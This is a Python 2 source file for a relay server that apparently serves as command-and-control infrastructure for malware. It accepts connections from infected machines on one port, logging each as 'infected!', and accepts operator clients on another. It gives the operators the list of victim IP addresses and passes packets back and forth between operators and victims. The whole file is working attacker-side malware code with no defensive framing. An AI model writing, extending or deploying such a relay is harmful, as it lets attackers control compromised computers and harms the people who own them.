import socket
import sys
import signal
from PIL import Image
from StringIO import StringIO
import threading, time
from packet import Packet
from Queue import Queue

class RelayServer:
    def __init__(self):
        self.toClient = {}
        self.toVirus = {}

    def runVirus(self):
        host = '0.0.0.0'
        port = 5715 
        backlog = 5
        size = 1
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((host,port))
        s.listen(backlog)

        while True:
            client,address = s.accept()
            self.onVirusConnect(client,address)

    def runClient(self):
        host = '0.0.0.0'
        port = 5720
        backlog = 5
        size = 1
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((host,port))
        s.listen(backlog)

        while True:
            client,address = s.accept()
            self.onClientConnect(client,address)

    def run(self):
        threading.Thread(target=self.runClient).start()
        threading.Thread(target=self.runVirus).start()


    def sendIPList(self,address=""):
        state = "100"
        ips = ",".join(self.toVirus.keys())
        length = len(ips)

        print length

        pkt = Packet()
        pkt.state = state
        pkt.length = str(length)
        pkt.data = ips
        pkt.returnIP = address[0]

        print pkt

        if address != "":
            self.enqueueToClient(pkt)
        else:
            for ip in self.toVirus.keys():
                self.enqueueToClient(pkt,ip)

    def onVirusConnect(self,client,address):
        print address[0] + " infected!"
        q = Queue()
        self.toVirus[address[0]] = (client,q)
        threading.Thread(target=self.receiveFromVirus,args=[client]).start()
        threading.Thread(target=self.dequeue,args=[q,client]).start()

    def receiveFromVirus(self,s):
        while True:
            pkt = Packet()
            pkt.construct(s)
            print "from virus: " + pkt
            self.enqueueToClient(pkt)


    def onClientConnect(self,client,address):
        print address[0] + " connected!"
        q = Queue()
        self.toClient[address[0]] = (client,q)
        self.sendIPList(address)
        print "IPs sent!"
        threading.Thread(target=self.receiveFromClient,args=[client,address]).start()
        threading.Thread(target=self.dequeue,args=[q,client]).start()

    def receiveFromClient(self,s,address):
        while True:
            pkt = Packet()
            pkt.construct(s)
            print "from client: " + str(pkt)
            pkt.returnIP = address[0]
            self.enqueueToVirus(pkt)

    def enqueueToClient(self,pkt,address=""):
        if address == "":
            q = self.toClient[pkt.returnIP][1]
        else:
            q = self.toClient[address][1]
        q.put(pkt)

    def enqueueToVirus(self,pkt):
        q = self.toVirus[pkt.toIP][1]
        q.put(pkt)

    def dequeue(self,q,s):
        while True:
            pkt = q.get()
            pkt.send(s)

def main():
    r = RelayServer()
    r.run()

if __name__ == '__main__':
    main()